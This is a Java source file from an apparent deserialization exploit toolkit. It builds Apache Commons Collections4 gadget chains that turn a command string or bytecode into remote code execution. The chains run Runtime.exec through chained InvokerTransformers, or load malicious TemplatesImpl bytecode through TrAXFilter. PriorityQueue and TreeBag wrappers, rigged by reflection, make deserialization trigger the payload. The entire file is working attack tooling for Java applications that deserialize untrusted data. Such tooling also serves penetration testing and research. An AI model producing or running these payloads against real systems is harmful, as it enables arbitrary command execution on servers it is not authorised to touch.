package xyz.eki.marshalexp.gadget.cc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import xyz.eki.marshalexp.gadget.jdk.GRMIConnector;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.ReflectUtils;

import javax.xml.transform.Templates;
import java.lang.reflect.Method;
import java.util.PriorityQueue;

public class GCC4 {

    public static Transformer invokerTransformer2RCE(String cmd){
        //Runtime.getRuntime().exec();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { cmd })
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        return transformerChain;
    }



    public static Transformer instantiateTransformer2RCE(String cmd) throws Exception {
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] {GTemplates.getEvilTemplates(cmd)} )};
        Transformer transformerChain = new ChainedTransformer(transformers);
        return transformerChain;
    }

    public static Transformer instantiateTransformer2RCE(byte[] bytes) throws Exception {
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] {GTemplates.getEvilTemplates(bytes)} )};
        Transformer transformerChain = new ChainedTransformer(transformers);
        return transformerChain;
    }

    public static PriorityQueue deserialize2TransformerInvoke(Transformer chainedTransformer) throws Exception{
        PriorityQueue priorityQueue = new PriorityQueue(2);
        //先设置为正常变量值，后面可以通过setFieldValue修改
        priorityQueue.add(1);
        priorityQueue.add(1);


        TransformingComparator comparator = new TransformingComparator(chainedTransformer);
        //反射设置 Field
        Object[] objects = new Object[]{"whatever", "whatever"};
        ReflectUtils.setFieldValue(priorityQueue, "queue", objects);
        ReflectUtils.setFieldValue(priorityQueue, "comparator", comparator);

        return priorityQueue;
    }

    public static PriorityQueue deserialize2MethodInvoke(Object obj,String methodName) throws Exception{
        return deserialize2MethodInvoke(obj,methodName,null,null);
    }

    public static PriorityQueue deserialize2MethodInvoke(Object obj,String methodName,Class[] paramTypes, Object[] args) throws Exception{
        PriorityQueue priorityQueue = new PriorityQueue(2);
        InvokerTransformer invokerTransformer = new InvokerTransformer(methodName, paramTypes, args);
        //先设置为正常变量值，后面可以通过setFieldValue修改
        priorityQueue.add(1);
        priorityQueue.add(1);


        TransformingComparator comparator = new TransformingComparator(invokerTransformer);
        //反射设置 Field
        //随便填一个obj
        Object[] objects = new Object[]{obj, null};
        ReflectUtils.setFieldValue(priorityQueue, "queue", objects);
        ReflectUtils.setFieldValue(priorityQueue, "comparator", comparator);

        return priorityQueue;
    }

    public static TreeBag deserializeTreeBag2MethodInvoke(Object obj,String methodName) throws Exception{
        return deserializeTreeBag2MethodInvoke(obj,methodName,null,null);
    }

    public static TreeBag deserializeTreeBag2MethodInvoke(Object obj,String methodName,Class[] paramTypes, Object[] args) throws Exception {

        // setup harmless chain
        final InvokerTransformer transformer = new InvokerTransformer("toString", null,null);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(obj);

        // getOutputProperties or newTransformer
        ReflectUtils.setFieldValue(transformer, "iMethodName", methodName);
        ReflectUtils.setFieldValue(transformer,"iParamTypes",paramTypes);
        ReflectUtils.setFieldValue(transformer,"iArgs",args);
        return tree;
    }
}
